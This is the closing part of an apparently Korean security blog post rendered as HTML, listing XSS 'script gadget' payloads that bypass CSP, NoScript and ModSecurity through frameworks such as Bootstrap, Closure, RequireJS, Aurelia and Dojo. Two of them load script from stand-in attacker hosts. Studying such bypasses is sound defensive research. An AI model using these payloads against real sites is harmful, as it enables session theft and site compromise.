+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-toggle</span><span class="hljs-operator">=</span><span class="hljs-string">tooltip</span> <span class="hljs-attr">data-html</span><span class="hljs-operator">=</span><span class="hljs-string">true</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;&lt;script&gt;alert(45)&lt;/script&gt;&#39;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Bypassing CSP strict-dynamic via Bootstrap</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-toggle</span><span class="hljs-operator">=</span><span class="hljs-string">tooltip</span> <span class="hljs-attr">data-html</span><span class="hljs-operator">=</span><span class="hljs-string">true</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;&lt;script&gt;alert(45)&lt;/script&gt;&#39;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Google Closure</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">a</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">CLOSURE_BASE_PATH</span> <span class="hljs-attr">href</span><span class="hljs-operator">=</span><span class="hljs-string">data:/,1/alert(45)//</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">a</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">form</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">CLOSURE_UNCOMPILED_DEFINES</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">form</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Bypassing NoScript via Closure (DOM clobbering)</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">a</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">CLOSURE_BASE_PATH</span> <span class="hljs-attr">href</span><span class="hljs-operator">=</span><span class="hljs-string">http://attacker/xss</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">a</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>RequireJS</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">data-main</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;data:1,alert(45)&#39;</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;require.js&#39;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Enber</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">//i.am.an.invalid.self.closing.script.tag</span> <span class="hljs-attr">csp</span><span class="hljs-operator">=</span><span class="hljs-string">ignores-me</span> <span class="hljs-punctuation">/</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-operator">&lt;</span>script type<span class="hljs-operator">=</span>text<span class="hljs-operator">/</span>x<span class="hljs-operator">-</span>handlebars<span class="hljs-operator">&gt;</span>
+ <span class="hljs-operator">&lt;</span>script src<span class="hljs-operator">=</span><span class="hljs-comment">//attacker.example.com// /&gt;
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Ajaxify</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;document-script&quot;</span><span class="hljs-punctuation">&gt;</span>alert(45)<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Aurelia</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">ref</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;me&quot;</span>
+<span class="hljs-attr">s</span>.<span class="hljs-attr">bind</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$this.me.ownerDocument.createElement(&#39;script&#39;)&quot;</span>
+<span class="hljs-attr">data-bar</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;${$this.me.s.src=&#39;data:,alert(45)&#39;}&quot;</span>
+<span class="hljs-attr">data-foobar</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;${$this.me.ownerDocument.body.appendChild($this.me.s)}&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>ModSecurity CRS via Dojo Toolkit</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-dojo-type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;dijit/Declaration&quot;</span> <span class="hljs-attr">data-dojo-props</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;}-alert(45)-{&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>CSP unsafe-eval via underscore templates</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">underscore/template</span><span class="hljs-punctuation">&gt;</span> &lt;% alert(45) %&gt; <span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="conclusion">Conclusion</h2>
+<p>어떻게 보면 알려진 방법일수도 있고 새로운 방법일수도 있습니다. 다만 중요한건 이전에 angularjs sandbox escape 포스팅에서도 이야기드렸듯이(이야기안했나..?) 방법으로 인한 여러 우회 케이스가 발견될 수 있다는 겁니다.</p>
+<blockquote>
+<p>※ <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/07/web-hacking-angularjs-sandboxdom-based.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/07/web-hacking-angularjs-sandboxdom-based.html</a></p>
+</blockquote>
+<p>분명히 위에있는 Framework, Library 뿐만 아니라 다른 곳에서도 발견될 수 있고 직접 적용한 Filtering에도 적용될 수 있기 때문에 이런 기법에 대한 내용은 중요하다고 생각이 드네요.</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a>
+<a href="https://msdn.microsoft.com/en-us/library/hh567599(v=cs.95).aspx">https://msdn.microsoft.com/en-us/library/hh567599(v=cs.95).aspx</a>
+<a href="https://developers.google.com/gadgets/docs/fundamentals?hl=ko">https://developers.google.com/gadgets/docs/fundamentals?hl=ko</a>
+<a href="https://www.youtube.com/watch?v=p07acPBi-qw">https://www.youtube.com/watch?v=p07acPBi-qw</a>
+<a href="https://www.w3schools.com/jquery/jquery_ref_selectors.asp">https://www.w3schools.com/jquery/jquery_ref_selectors.asp</a>
+<a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/07/web-hacking-angularjs-sandboxdom-based.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/07/web-hacking-angularjs-sandboxdom-based.html</a>
+<a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/01/web-hacking-xxn-attackx-xss-nightmare-r.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/01/web-hacking-xxn-attackx-xss-nightmare-r.html</a>
+<a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/05/web-hacking-xdexss-dom-base-evasion.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/05/web-hacking-xdexss-dom-base-evasion.html</a></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
